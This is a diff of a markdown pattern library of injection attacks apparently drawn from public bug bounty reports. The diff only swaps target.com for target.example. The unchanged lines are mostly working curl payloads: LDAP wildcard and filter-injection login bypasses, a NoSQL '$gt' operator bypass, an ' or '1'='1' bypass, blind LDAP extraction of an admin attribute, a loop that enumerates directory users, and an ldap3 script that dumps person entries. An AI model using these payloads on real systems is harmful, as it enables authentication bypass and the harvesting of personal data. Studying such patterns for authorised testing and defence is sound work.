@@ -13,7 +13,7 @@ Pattern library built from 8 public bug bounty reports.
 
 **Injection:**
 ```bash
-curl -s -X POST https://target.com/api/login \
+curl -s -X POST https://target.example/api/login \
   -H "Content-Type: application/json" \
   -d '{"username": "admin)(&", "password": "anything"}'
 ```
@@ -31,7 +31,7 @@ curl -s -X POST https://target.com/api/login \
 **Injection:** Username = `*` (LDAP wildcard matches anything)
 
 ```bash
-curl -s -X POST https://target.com/sso/login \
+curl -s -X POST https://target.example/sso/login \
   -H "Content-Type: application/json" \
   -d '{"username": "*", "password": {"$gt": ""}}'
 ```
@@ -44,7 +44,7 @@ curl -s -X POST https://target.com/sso/login \
 
 **LDAP search endpoint exposed:**
 ```bash
-curl -s "https://target.com/api/directory/search?q=john" | python3 -m json.tool
+curl -s "https://target.example/api/directory/search?q=john" | python3 -m json.tool
 # Returns: {"users": [{"cn": "John Smith", "mail": "jsmith@company.com", ...}]}
 ```
 
@@ -52,7 +52,7 @@ curl -s "https://target.com/api/directory/search?q=john" | python3 -m json.tool
 ```bash
 # Enumerate all users by first letter
 for LETTER in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
-  COUNT=$(curl -s "https://target.com/api/directory/search?q=$LETTER*" | \
+  COUNT=$(curl -s "https://target.example/api/directory/search?q=$LETTER*" | \
     python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('users',[])))")
   echo "$LETTER*: $COUNT users"
 done
@@ -85,7 +85,7 @@ done
 
 **Bypass payload:**
 ```bash
-curl -s -X POST https://target.com/api/login \
+curl -s -X POST https://target.example/api/login \
   --data-urlencode "username=' or '1'='1" \
   --data-urlencode "password=' or '1'='1"
 ```
@@ -105,7 +105,7 @@ Returns first user in XML store → admin.
 **Attack:** Extract password hash character by character:
 ```bash
 # Is first char of admin's description 'c'?
-curl -s -X POST https://target.com/api/login \
+curl -s -X POST https://target.example/api/login \
   -d "username=admin)(description=c*))(&(uid=x&password=x"
 # Different response length when char matches → confirmed blind injection
 ```
@@ -120,7 +120,7 @@ pip3 install ldap3
 
 python3 -c "
 from ldap3 import Server, Connection, ALL
-s = Server('target.com', get_info=ALL)
+s = Server('target.example', get_info=ALL)
 c = Connection(s, user='cn=admin,dc=target,dc=com', password='pass', auto_bind=True)
 c.search('dc=target,dc=com', '(objectclass=person)', attributes=['cn','mail','memberOf'])
 print(c.entries)
